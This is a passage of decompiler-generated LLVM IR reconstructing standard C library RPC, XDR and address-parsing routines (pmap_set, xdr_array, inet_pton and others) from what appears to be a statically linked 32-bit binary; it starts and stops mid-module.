  uselistorder i16 8, { 0, 3, 4, 1, 5, 7, 2, 6 }
  uselistorder i16 2, { 2, 0, 3, 1, 6, 4, 5 }
  uselistorder i32 (i32)* @__GI_exit, { 2, 1, 0, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 3, 2, 8, 7, 0, 1, 6, 9, 5, 4 }
  uselistorder i32 4096, { 8, 12, 13, 4, 11, 7, 9, 0, 1, 10, 5, 3, 6, 2 }
  uselistorder i32 (i32, i32, i32)* @socket, { 1, 4, 0, 9, 8, 7, 6, 5, 3, 2 }
  uselistorder label %dec_label_pc_8058e8f, { 1, 0 }
  uselistorder label %dec_label_pc_8058e62, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8058dea, { 1, 0 }
  uselistorder label %dec_label_pc_8058dc9, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp12, i32* %stack_var_-12, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v0_8058e9a = load i32, i32* @ebx, align 4
  %v2_8058e9e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8058e9e, i32* @ebx, align 4
  store i32 -1, i32* %stack_var_-8, align 4
  store i32 %v2_8058e9e, i32* @eax, align 4
  %v2_8058eac = call i32 @__get_myaddress(i32 -1, i32 %v0_8058e9a)
  %v1_8058eb1 = icmp eq i32 %v2_8058eac, 0
  br i1 %v1_8058eb1, label %entry.dec_label_pc_8058f45_crit_edge, label %dec_label_pc_8058eb9

entry.dec_label_pc_8058f45_crit_edge:             ; preds = %entry
  br label %dec_label_pc_8058f45

dec_label_pc_8058eb9:                             ; preds = %entry
  %v2_8058ec3 = ptrtoint i32* %stack_var_-8 to i32
  %v9_8058edc = call i32 @__GI_clntudp_bufcreate(i32 %v2_8058e9e, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8058ec3, i32 400, i32 400)
  store i32 %v9_8058edc, i32* %ebx.global-to-local, align 4
  %v1_8058ee6 = icmp eq i32 %v9_8058edc, 0
  br i1 %v1_8058ee6, label %dec_label_pc_8058f45, label %dec_label_pc_8058eea

dec_label_pc_8058eea:                             ; preds = %dec_label_pc_8058eb9
  %v1_8058f12 = add i32 %v9_8058edc, 4
  %v2_8058f12 = inttoptr i32 %v1_8058f12 to i32*
  %v3_8058f12 = load i32, i32* %v2_8058f12, align 4
  store i32 %v3_8058f12, i32* @ecx, align 4
  %v5_8058f30 = inttoptr i32 %v3_8058f12 to i32*
  %v6_8058f30 = load i32, i32* %v5_8058f30, align 4
  call void @__pseudo_call(i32 %v6_8058f30)
  %v0_8058f35 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8058f35 = add i32 %v0_8058f35, 4
  %v2_8058f35 = inttoptr i32 %v1_8058f35 to i32*
  %v3_8058f35 = load i32, i32* %v2_8058f35, align 4
  %v5_8058f39 = add i32 %v3_8058f35, 16
  %v6_8058f39 = inttoptr i32 %v5_8058f39 to i32*
  %v7_8058f39 = load i32, i32* %v6_8058f39, align 4
  call void @__pseudo_call(i32 %v7_8058f39)
  %v2_8058f4a.pre = load i32, i32* %stack_var_-12, align 4
  br label %dec_label_pc_8058f47

dec_label_pc_8058f45:                             ; preds = %entry.dec_label_pc_8058f45_crit_edge, %dec_label_pc_8058eb9
  br label %dec_label_pc_8058f47

dec_label_pc_8058f47:                             ; preds = %dec_label_pc_8058eea, %dec_label_pc_8058f45
  %v2_8058f4a = phi i32 [ %v2_8058f4a.pre, %dec_label_pc_8058eea ], [ %tmp12, %dec_label_pc_8058f45 ]
  %v0_8058f4b = phi i32 [ %tmp, %dec_label_pc_8058eea ], [ 0, %dec_label_pc_8058f45 ]
  store i32 %v2_8058f4a, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8058f4b

; uselistorder directives
  uselistorder i32 %v9_8058edc, { 0, 2, 1 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
  uselistorder label %dec_label_pc_8058f47, { 1, 0 }
  uselistorder label %dec_label_pc_8058f45, { 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8058f4d = load i32, i32* @ebx, align 4
  %v2_8058f51 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8058f51, i32* @ebx, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %v2_8058f51, i32* @eax, align 4
  store i32 -1, i32* %stack_var_-12, align 4
  %v2_8058f63 = call i32 @__get_myaddress(i32 -1, i32 %v0_8058f4d)
  %v1_8058f68 = icmp eq i32 %v2_8058f63, 0
  br i1 %v1_8058f68, label %entry.dec_label_pc_805901a_crit_edge, label %dec_label_pc_8058f70

entry.dec_label_pc_805901a_crit_edge:             ; preds = %entry
  br label %dec_label_pc_805901a

dec_label_pc_8058f70:                             ; preds = %entry
  %v2_8058f7a = ptrtoint i32* %stack_var_-12 to i32
  %v9_8058f93 = call i32 @__GI_clntudp_bufcreate(i32 %v2_8058f51, i32 100000, i32 2, i32 5, i32* null, i32 %v2_8058f7a, i32 400, i32 400)
  store i32 %v9_8058f93, i32* @ebx, align 4
  %v1_8058f9d = icmp eq i32 %v9_8058f93, 0
  br i1 %v1_8058f9d, label %dec_label_pc_805901a, label %dec_label_pc_8059007

dec_label_pc_8059007:                             ; preds = %dec_label_pc_8058f70
  %v1_8058fc8 = add i32 %v9_8058f93, 4
  %v2_8058fc8 = inttoptr i32 %v1_8058fc8 to i32*
  %v3_8058fc8 = load i32, i32* %v2_8058fc8, align 4
  store i32 %v3_8058fc8, i32* @ecx, align 4
  %v5_8058fe6 = inttoptr i32 %v3_8058fc8 to i32*
  %v6_8058fe6 = load i32, i32* %v5_8058fe6, align 4
  call void @__pseudo_call(i32 %v6_8058fe6)
  %v0_8058fef = load i32, i32* @esi, align 4
  %v0_8058ff6 = load i32, i32* @ebx, align 4
  %v4_8058ff7 = call i32 @clnt_perror(i32 %v0_8058ff6, i32 ptrtoint ([24 x i8]* @global_var_805ccc4.344 to i32), i32 %v0_8058fef, i32 %v0_8058fef)
  %v0_805900a = load i32, i32* @ebx, align 4
  %v1_805900a = add i32 %v0_805900a, 4
  %v2_805900a = inttoptr i32 %v1_805900a to i32*
  %v3_805900a = load i32, i32* %v2_805900a, align 4
  %v5_805900e = add i32 %v3_805900a, 16
  %v6_805900e = inttoptr i32 %v5_805900e to i32*
  %v7_805900e = load i32, i32* %v6_805900e, align 4
  call void @__pseudo_call(i32 %v7_805900e)
  br label %dec_label_pc_805901c

dec_label_pc_805901a:                             ; preds = %entry.dec_label_pc_805901a_crit_edge, %dec_label_pc_8058f70
  br label %dec_label_pc_805901c

dec_label_pc_805901c:                             ; preds = %dec_label_pc_8059007, %dec_label_pc_805901a
  %v0_8059021 = phi i32 [ %tmp, %dec_label_pc_8059007 ], [ 0, %dec_label_pc_805901a ]
  ret i32 %v0_8059021

; uselistorder directives
  uselistorder i32 %v9_8058f93, { 0, 2, 1 }
  uselistorder i32* %stack_var_-12, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32*, i32, i32, i32)* @__GI_clntudp_bufcreate, { 0, 3, 2, 1 }
  uselistorder i32* null, { 0, 1, 3, 2, 7, 4, 8, 9, 5, 6, 10, 11, 12, 13, 14, 15, 16, 17 }
  uselistorder i32 100000, { 1, 2, 0 }
  uselistorder i32 (i32, i32)* @__get_myaddress, { 1, 0 }
  uselistorder label %dec_label_pc_805901c, { 1, 0 }
  uselistorder label %dec_label_pc_805901a, { 1, 0 }
}

define i32 @_rpc_dtablesize(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_8059027 = load i32, i32* @global_var_8067410.345, align 16
  %v1_8059027 = icmp eq i32 %v0_8059027, 0
  %v1_805902e = icmp eq i1 %v1_8059027, false
  br i1 %v1_805902e, label %dec_label_pc_805903a, label %dec_label_pc_8059030

dec_label_pc_8059030:                             ; preds = %entry
  %v0_8059030 = call i32 @getdtablesize()
  store i32 %v0_8059030, i32* @global_var_8067410.345, align 16
  br label %dec_label_pc_805903a

dec_label_pc_805903a:                             ; preds = %entry, %dec_label_pc_8059030
  %v0_805903a = phi i32 [ %v0_8059027, %entry ], [ %v0_8059030, %dec_label_pc_8059030 ]
  ret i32 %v0_805903a

; uselistorder directives
  uselistorder label %dec_label_pc_805903a, { 1, 0 }
}

define i32 @xdr_vector(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  store i32 %arg4, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* %ebx.global-to-local, align 4
  %v10_805906f22 = icmp eq i32 %arg3, 0
  br i1 %v10_805906f22, label %dec_label_pc_8059075, label %dec_label_pc_805905b.lr.ph

dec_label_pc_805905b.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_805905b

dec_label_pc_805905b:                             ; preds = %dec_label_pc_805905b.lr.ph, %dec_label_pc_805906c
  call void @__pseudo_call(i32 %arg5)
  %v0_8059068 = load i32, i32* @eax, align 4
  %v1_8059068 = icmp eq i32 %v0_8059068, 0
  br i1 %v1_8059068, label %dec_label_pc_805907a, label %dec_label_pc_805906c

dec_label_pc_805906c:                             ; preds = %dec_label_pc_805905b
  %v0_805906c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805906c = load i32, i32* %ebp.global-to-local, align 4
  %v2_805906c = add i32 %v1_805906c, %v0_805906c
  store i32 %v2_805906c, i32* %ebx.global-to-local, align 4
  %v0_805906e = load i32, i32* %esi.global-to-local, align 4
  %v1_805906e = add i32 %v0_805906e, 1
  store i32 %v1_805906e, i32* %esi.global-to-local, align 4
  %v10_805906f = icmp ult i32 %v1_805906e, %arg3
  br i1 %v10_805906f, label %dec_label_pc_805905b, label %dec_label_pc_8059075

dec_label_pc_8059075:                             ; preds = %entry, %dec_label_pc_805906c
  br label %dec_label_pc_805907a

dec_label_pc_805907a:                             ; preds = %dec_label_pc_805905b, %dec_label_pc_8059075
  ret i32 1

; uselistorder directives
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder label %dec_label_pc_805907a, { 1, 0 }
  uselistorder label %dec_label_pc_8059075, { 1, 0 }
  uselistorder label %dec_label_pc_805905b, { 1, 0 }
}

define i32 @__GI_xdr_array(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp9 = sext i32 %arg5 to i64
  %tmp12 = ptrtoint i32* %arg1 to i32
  %v0_8059082 = load i32, i32* @ebp, align 4
  %v0_8059083 = load i32, i32* @edi, align 4
  %v0_8059084 = load i32, i32* @esi, align 4
  store i32 %arg2, i32* @eax, align 4
  store i32 %arg3, i32* %esi.global-to-local, align 4
  %v1_8059091 = inttoptr i32 %arg2 to i32*
  %v6_8059098 = call i32 @xdr_u_long(i32* %arg1, i32 %arg3)
  store i32 %v6_8059098, i32* %eax.global-to-local, align 4
  %v1_80590a0 = icmp eq i32 %v6_8059098, 0
  br i1 %v1_80590a0, label %dec_label_pc_805917a, label %dec_label_pc_80590a8

dec_label_pc_80590a8:                             ; preds = %entry
  %v0_80590a8 = load i32, i32* %esi.global-to-local, align 4
  %v1_80590a8 = inttoptr i32 %v0_80590a8 to i32*
  %v2_80590a8 = load i32, i32* %v1_80590a8, align 4
  store i32 %v2_80590a8, i32* @edi, align 4
  %v6_80590ae = icmp ugt i32 %v2_80590a8, %arg4
  br i1 %v6_80590ae, label %dec_label_pc_80590bd, label %dec_label_pc_80590b0

dec_label_pc_80590b0:                             ; preds = %dec_label_pc_80590a8
  %v12_80590b5 = udiv i64 4294967295, %tmp9
  %v13_80590b5 = trunc i64 %v12_80590b5 to i32
  store i32 %v13_80590b5, i32* %eax.global-to-local, align 4
  %v14_80590b5 = urem i64 4294967295, %tmp9
  %v15_80590b5 = trunc i64 %v14_80590b5 to i32
  store i32 %v15_80590b5, i32* @edx, align 4
  %tmp = icmp ugt i32 %v2_80590a8, %v13_80590b5
  br i1 %tmp, label %dec_label_pc_80590bd, label %dec_label_pc_80590ca

dec_label_pc_80590bd:                             ; preds = %dec_label_pc_80590b0, %dec_label_pc_80590a8
  store i32 %tmp12, i32* @edx, align 4
  %v2_80590c1 = load i32, i32* %arg1, align 4
  %v11_80590c1 = icmp eq i32 %v2_80590c1, 2
  %v1_80590c4 = icmp eq i1 %v11_80590c1, false
  br i1 %v1_80590c4, label %dec_label_pc_805917a, label %dec_label_pc_80590ca

dec_label_pc_80590ca:                             ; preds = %dec_label_pc_80590b0, %dec_label_pc_80590bd
  %v0_80590ca = load i32, i32* @ebx, align 4
  %v1_80590ca = icmp eq i32 %v0_80590ca, 0
  %v1_80590cc = icmp eq i1 %v1_80590ca, false
  br i1 %v1_80590cc, label %dec_label_pc_805912d, label %dec_label_pc_80590ce

dec_label_pc_80590ce:                             ; preds = %dec_label_pc_80590ca
  store i32 %tmp12, i32* @edx, align 4
  %v2_80590d2 = load i32, i32* %arg1, align 4
  store i32 %v2_80590d2, i32* %eax.global-to-local, align 4
  %v9_80590d4 = icmp eq i32 %v2_80590d2, 1
  br i1 %v9_80590d4, label %dec_label_pc_80590e3, label %dec_label_pc_80590d9

dec_label_pc_80590d9:                             ; preds = %dec_label_pc_80590ce
  %v9_80590d9 = icmp eq i32 %v2_80590d2, 2
  %v1_80590dc = icmp eq i1 %v9_80590d9, false
  br i1 %v1_80590dc, label %dec_label_pc_805912d, label %dec_label_pc_805917e

dec_label_pc_80590e3:                             ; preds = %dec_label_pc_80590ce
  %v1_80590e3 = icmp eq i32 %v2_80590a8, 0
  br i1 %v1_80590e3, label %dec_label_pc_805917e, label %dec_label_pc_80590eb

dec_label_pc_80590eb:                             ; preds = %dec_label_pc_80590e3
  %v4_80590f2 = mul i32 %v2_80590a8, %arg5
  store i32 %v4_80590f2, i32* @esi, align 4
  %v2_80590f6 = call i32 @malloc(i32 %v4_80590f2)
  store i32 %v2_80590f6, i32* @ebx, align 4
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v1_8059104 = icmp eq i32 %v2_80590f6, 0
  store i32 %v2_80590f6, i32* %v1_8059091, align 4
  %v1_8059108 = icmp eq i1 %v1_8059104, false
  br i1 %v1_8059108, label %dec_label_pc_8059120, label %dec_label_pc_805910a

dec_label_pc_805910a:                             ; preds = %dec_label_pc_80590eb
  %v0_805910c = load i32, i32* @global_var_80627d0, align 16
  %v3_8059117 = call i32 @__GI_fputs(i32 ptrtoint ([26 x i8]* @global_var_805ccec.346 to i32), i32 %v0_805910c)
  store i32 %v3_8059117, i32* %eax.global-to-local, align 4
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059175

dec_label_pc_8059120:                             ; preds = %dec_label_pc_80590eb
  %v0_8059121 = load i32, i32* @esi, align 4
  %v0_8059124 = load i32, i32* @ebx, align 4
  %v5_8059124 = inttoptr i32 %v0_8059124 to i8*
  %v5_8059125 = call i32 @__GI_memset(i8* %v5_8059124, i32 0, i32 %v0_8059121)
  store i32 %v5_8059125, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805912d

dec_label_pc_805912d:                             ; preds = %dec_label_pc_80590d9, %dec_label_pc_80590ca, %dec_label_pc_8059120
  store i32 0, i32* @ebp, align 4
  store i32 1, i32* @esi, align 4
  %v7_805914c27 = icmp ne i32 %v2_80590a8, 0
  %v1_805914e31 = icmp eq i1 %v7_805914c27, false
  br i1 %v1_805914e31, label %dec_label_pc_8059154, label %dec_label_pc_8059150

dec_label_pc_8059136:                             ; preds = %dec_label_pc_8059150
  %v1_805913a = add i32 %v0_805913a34, 1
  store i32 %v1_805913a, i32* @ebp, align 4
  call void @__pseudo_call(i32 %arg5)
  %v0_8059143 = load i32, i32* @ebx, align 4
  %v5_8059143 = add i32 %v0_8059143, %arg4
  store i32 %v5_8059143, i32* @ebx, align 4
  %v0_8059147 = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_8059147, i32* @esi, align 4
  %v0_805914c.pre = load i32, i32* @ebp, align 4
  %v7_805914c = icmp ult i32 %v0_805914c.pre, %v2_80590a8
  %v1_805914e = icmp eq i1 %v7_805914c, false
  br i1 %v1_805914e, label %dec_label_pc_8059154, label %dec_label_pc_8059150

dec_label_pc_8059150:                             ; preds = %dec_label_pc_805912d, %dec_label_pc_8059136
  %v0_805913a34 = phi i32 [ %v0_805914c.pre, %dec_label_pc_8059136 ], [ 0, %dec_label_pc_805912d ]
  %v0_805915033 = phi i32 [ %v0_8059147, %dec_label_pc_8059136 ], [ 1, %dec_label_pc_805912d ]
  %v1_8059150 = icmp eq i32 %v0_805915033, 0
  %v1_8059152 = icmp eq i1 %v1_8059150, false
  br i1 %v1_8059152, label %dec_label_pc_8059136, label %dec_label_pc_8059154

dec_label_pc_8059154:                             ; preds = %dec_label_pc_8059136, %dec_label_pc_8059150, %dec_label_pc_805912d
  %v0_8059150.lcssa = phi i32 [ 1, %dec_label_pc_805912d ], [ %v0_805915033, %dec_label_pc_8059150 ], [ %v0_8059147, %dec_label_pc_8059136 ]
  %v2_8059158 = load i32, i32* %arg1, align 4
  %v11_8059158 = icmp eq i32 %v2_8059158, 2
  %v1_805915b = icmp eq i1 %v11_8059158, false
  br i1 %v1_805915b, label %dec_label_pc_8059183, label %dec_label_pc_805915d

dec_label_pc_805915d:                             ; preds = %dec_label_pc_8059154
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8059164 = load i32, i32* %v1_8059091, align 4
  %v2_8059166 = call i32 @free(i32 %v2_8059164)
  store i32 %v2_8059166, i32* %eax.global-to-local, align 4
  store i32 0, i32* %v1_8059091, align 4
  %v0_8059186.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8059175

dec_label_pc_8059175:                             ; preds = %dec_label_pc_805910a, %dec_label_pc_805915d
  %v0_8059186.pre = phi i32 [ 0, %dec_label_pc_805910a ], [ %v0_8059186.pre.pre, %dec_label_pc_805915d ]
  br label %dec_label_pc_8059183

dec_label_pc_805917a:                             ; preds = %dec_label_pc_80590bd, %entry
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059183

dec_label_pc_805917e:                             ; preds = %dec_label_pc_80590d9, %dec_label_pc_80590e3
  store i32 1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8059183

dec_label_pc_8059183:                             ; preds = %dec_label_pc_8059154, %dec_label_pc_805917a, %dec_label_pc_8059175, %dec_label_pc_805917e
  %v0_8059186 = phi i32 [ %v0_8059150.lcssa, %dec_label_pc_8059154 ], [ 0, %dec_label_pc_805917a ], [ %v0_8059186.pre, %dec_label_pc_8059175 ], [ 1, %dec_label_pc_805917e ]
  store i32 %v0_8059186, i32* %eax.global-to-local, align 4
  store i32 %v0_8059084, i32* %esi.global-to-local, align 4
  store i32 %v0_8059083, i32* @edi, align 4
  store i32 %v0_8059082, i32* @ebp, align 4
  ret i32 %v0_8059186

; uselistorder directives
  uselistorder i32 %v0_8059186, { 1, 0 }
  uselistorder i32 %v4_80590f2, { 1, 0 }
  uselistorder i32 %v2_80590a8, { 4, 2, 0, 3, 1, 5, 6 }
  uselistorder i32* %v1_8059091, { 1, 2, 0 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i64 4294967295, { 2, 3, 5, 4, 0, 1 }
  uselistorder i32 (i32*, i32)* @xdr_u_long, { 15, 16, 18, 5, 20, 19, 17, 3, 0, 6, 7, 1, 8, 4, 12, 13, 14, 2, 9, 10, 11 }
  uselistorder i32 %arg5, { 1, 0, 2 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_8059183, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_805917e, { 1, 0 }
  uselistorder label %dec_label_pc_8059175, { 1, 0 }
  uselistorder label %dec_label_pc_8059154, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8059150, { 1, 0 }
  uselistorder label %dec_label_pc_805912d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80590ca, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_8059192 = load i32, i32* @esi, align 4
  %v0_8059199 = load i32, i32* @eax, align 4
  store i32 %v0_8059199, i32* %ebx.global-to-local, align 4
  store i32 0, i32* @edx, align 4
  store i32 0, i32* @edi, align 4
  %v2_805919f = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805919f, i32* @esi, align 4
  store i32 0, i32* %stack_var_-20, align 4
  %v1_80591e715 = inttoptr i32 %v0_8059199 to i8*
  %v2_80591e716 = load i8, i8* %v1_80591e715, align 1
  %v3_80591e717 = sext i8 %v2_80591e716 to i32
  store i32 %v3_80591e717, i32* @ecx, align 4
  %v1_80591ea18 = add i32 %v0_8059199, 1
  store i32 %v1_80591ea18, i32* %ebx.global-to-local, align 4
  %v1_80591eb19 = icmp eq i8 %v2_80591e716, 0
  %v1_80591ed20 = icmp eq i1 %v1_80591eb19, false
  br i1 %v1_80591ed20, label %dec_label_pc_80591aa, label %dec_label_pc_80591ef

dec_label_pc_80591aa:                             ; preds = %entry, %dec_label_pc_80591e7.backedge
  %v3_80591e722 = phi i32 [ %v3_80591e7, %dec_label_pc_80591e7.backedge ], [ %v3_80591e717, %entry ]
  %v2_80591e721 = phi i8 [ %v2_80591e7, %dec_label_pc_80591e7.backedge ], [ %v2_80591e716, %entry ]
  %v1_80591aa = add nsw i32 %v3_80591e722, -48
  store i32 %v1_80591aa, i32* @eax, align 4
  %v6_80591b0 = icmp ugt i32 %v1_80591aa, 9
  br i1 %v6_80591b0, label %dec_label_pc_80591d3, label %dec_label_pc_80591b2

dec_label_pc_80591b2:                             ; preds = %dec_label_pc_80591aa
  %v0_80591b2 = load i32, i32* @esi, align 4
  %v1_80591b2 = inttoptr i32 %v0_80591b2 to i8*
  %v2_80591b2 = load i8, i8* %v1_80591b2, align 1
  %v2_80591b5 = zext i8 %v2_80591b2 to i32
  %v3_80591b5 = mul nuw nsw i32 %v2_80591b5, 10
  %v3_80591b8 = add nsw i32 %v3_80591b5, %v1_80591aa
  store i32 %v3_80591b8, i32* @eax, align 4
  %v6_80591c1 = icmp ugt i32 %v3_80591b8, 255
  br i1 %v6_80591c1, label %dec_label_pc_805920c, label %dec_label_pc_80591c3

dec_label_pc_80591c3:                             ; preds = %dec_label_pc_80591b2
  %v1_80591c3 = trunc i32 %v3_80591b8 to i8
  store i8 %v1_80591c3, i8* %v1_80591b2, align 1
  %v0_80591c5 = load i32, i32* @edx, align 4
  %v1_80591c5 = icmp eq i32 %v0_80591c5, 0
  %v1_80591c7 = icmp eq i1 %v1_80591c5, false
  br i1 %v1_80591c7, label %dec_label_pc_80591e7.backedge, label %dec_label_pc_80591c9

dec_label_pc_80591c9:                             ; preds = %dec_label_pc_80591c3
  %v0_80591c9 = load i32, i32* @edi, align 4
  %v1_80591c9 = add i32 %v0_80591c9, 1
  store i32 %v1_80591c9, i32* @edi, align 4
  %v1_80591ca = add i32 %v0_80591c9, -3
  %v6_80591ca = sub i32 2, %v0_80591c9
  %v7_80591ca = and i32 %v6_80591ca, %v1_80591c9
  %v8_80591ca = icmp slt i32 %v7_80591ca, 0
  %v9_80591ca = icmp eq i32 %v1_80591ca, 0
  %v10_80591ca = icmp slt i32 %v1_80591ca, 0
  %v3_80591cd = icmp eq i1 %v10_80591ca, %v8_80591ca
  %v4_80591cd = icmp eq i1 %v9_80591ca, false
  %v5_80591cd = and i1 %v4_80591cd, %v3_80591cd
  br i1 %v5_80591cd, label %dec_label_pc_805920c, label %dec_label_pc_80591cf

dec_label_pc_80591cf:                             ; preds = %dec_label_pc_80591c9
  %v1_80591cf = and i32 %v0_80591c5, -256
  %v2_80591cf = or i32 %v1_80591cf, 1
  store i32 %v2_80591cf, i32* @edx, align 4
  br label %dec_label_pc_80591e7.backedge

dec_label_pc_80591d3:                             ; preds = %dec_label_pc_80591aa
  %v9_80591d3 = icmp eq i8 %v2_80591e721, 46
  %v1_80591d6 = icmp eq i1 %v9_80591d3, false
  br i1 %v1_80591d6, label %dec_label_pc_805920c, label %dec_label_pc_80591d8

dec_label_pc_80591d8:                             ; preds = %dec_label_pc_80591d3
  %v0_80591d8 = load i32, i32* @edx, align 4
  %v1_80591d8 = icmp eq i32 %v0_80591d8, 0
  br i1 %v1_80591d8, label %dec_label_pc_805920c, label %dec_label_pc_80591dc

dec_label_pc_80591dc:                             ; preds = %dec_label_pc_80591d8
  %v0_80591dc = load i32, i32* @edi, align 4
  %v9_80591dc = icmp eq i32 %v0_80591dc, 4
  br i1 %v9_80591dc, label %dec_label_pc_805920c, label %dec_label_pc_80591e1

dec_label_pc_80591e1:                             ; preds = %dec_label_pc_80591dc
  %v0_80591e1 = load i32, i32* @esi, align 4
  %v1_80591e1 = add i32 %v0_80591e1, 1
  store i32 %v1_80591e1, i32* @esi, align 4
  store i32 0, i32* @edx, align 4
  %v1_80591e4 = inttoptr i32 %v1_80591e1 to i8*
  store i8 0, i8* %v1_80591e4, align 1
  br label %dec_label_pc_80591e7.backedge

dec_label_pc_80591e7.backedge:                    ; preds = %dec_label_pc_80591e1, %dec_label_pc_80591cf, %dec_label_pc_80591c3
  %v0_80591e7.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_80591e7 = inttoptr i32 %v0_80591e7.pre to i8*
  %v2_80591e7 = load i8, i8* %v1_80591e7, align 1
  %v3_80591e7 = sext i8 %v2_80591e7 to i32
  store i32 %v3_80591e7, i32* @ecx, align 4
  %v1_80591ea = add i32 %v0_80591e7.pre, 1
  store i32 %v1_80591ea, i32* %ebx.global-to-local, align 4
  %v1_80591eb = icmp eq i8 %v2_80591e7, 0
  %v1_80591ed = icmp eq i1 %v1_80591eb, false
  br i1 %v1_80591ed, label %dec_label_pc_80591aa, label %dec_label_pc_80591e7.dec_label_pc_80591ef_crit_edge

dec_label_pc_80591e7.dec_label_pc_80591ef_crit_edge: ; preds = %dec_label_pc_80591e7.backedge
  %v0_80591ef.pre = load i32, i32* @edi, align 4
  %phitmp = icmp sgt i32 %v0_80591ef.pre, 3
  br label %dec_label_pc_80591ef

dec_label_pc_80591ef:                             ; preds = %dec_label_pc_80591e7.dec_label_pc_80591ef_crit_edge, %entry
  %v0_80591ef = phi i1 [ %phitmp, %dec_label_pc_80591e7.dec_label_pc_80591ef_crit_edge ], [ false, %entry ]
  br i1 %v0_80591ef, label %dec_label_pc_80591f4, label %dec_label_pc_805920c

dec_label_pc_80591f4:                             ; preds = %dec_label_pc_80591ef
  %v0_80591f4 = load i32, i32* @eax, align 4
  %v3_80591fd = bitcast i32* %stack_var_-20 to i16*
  %v4_80591fd = call i32 @memcpy(i16* %v3_80591fd, i32 4, i32 %v0_80591f4)
  br label %dec_label_pc_805920e

dec_label_pc_805920c:                             ; preds = %dec_label_pc_80591dc, %dec_label_pc_80591d8, %dec_label_pc_80591d3, %dec_label_pc_80591c9, %dec_label_pc_80591b2, %dec_label_pc_80591ef
  br label %dec_label_pc_805920e

dec_label_pc_805920e:                             ; preds = %dec_label_pc_80591f4, %dec_label_pc_805920c
  %v0_8059215 = phi i32 [ 1, %dec_label_pc_80591f4 ], [ 0, %dec_label_pc_805920c ]
  store i32 %v0_8059192, i32* @esi, align 4
  ret i32 %v0_8059215

; uselistorder directives
  uselistorder i32 %v3_80591e7, { 1, 0 }
  uselistorder i8 %v2_80591e7, { 1, 2, 0 }
  uselistorder i32 %v1_80591ca, { 1, 0 }
  uselistorder i32* %ebx.global-to-local, { 2, 1, 0, 3 }
  uselistorder i32 255, { 7, 0, 8, 11, 1, 2, 9, 10, 12, 5, 3, 6, 4 }
  uselistorder label %dec_label_pc_805920e, { 1, 0 }
  uselistorder label %dec_label_pc_805920c, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_80591aa, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8059216 = load i32, i32* @ebp, align 4
  %v0_8059217 = load i32, i32* @edi, align 4
  %v0_8059218 = load i32, i32* @esi, align 4
  %v0_8059219 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v4_8059221 = ptrtoint i8* %arg2 to i32
  store i32 %v4_8059221, i32* @edi, align 4
  %v9_8059225 = icmp eq i32 %arg1, 2
  br i1 %v9_8059225, label %dec_label_pc_8059235, label %dec_label_pc_805922a

dec_label_pc_805922a:                             ; preds = %entry
  %v9_805922a = icmp eq i32 %arg1, 10
  %v1_805922d = icmp eq i1 %v9_805922a, false
